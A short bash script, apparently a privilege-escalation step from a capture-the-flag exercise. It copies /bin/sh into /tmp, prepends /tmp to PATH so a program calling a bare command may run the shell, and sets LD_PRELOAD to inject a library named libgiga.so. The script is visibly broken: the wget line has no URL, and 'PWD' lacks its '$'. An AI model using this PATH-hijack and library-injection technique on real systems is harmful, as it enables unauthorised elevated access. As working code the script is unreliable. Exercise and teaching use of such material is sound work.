#!/bin/bash
cp /bin/sh /tmp/win_sh
chmod +x /tmp/win_sh
export PATH="/tmp:$PATH"
wget -P ..
export LD_PRELOAD="PWD/../libgiga.so"
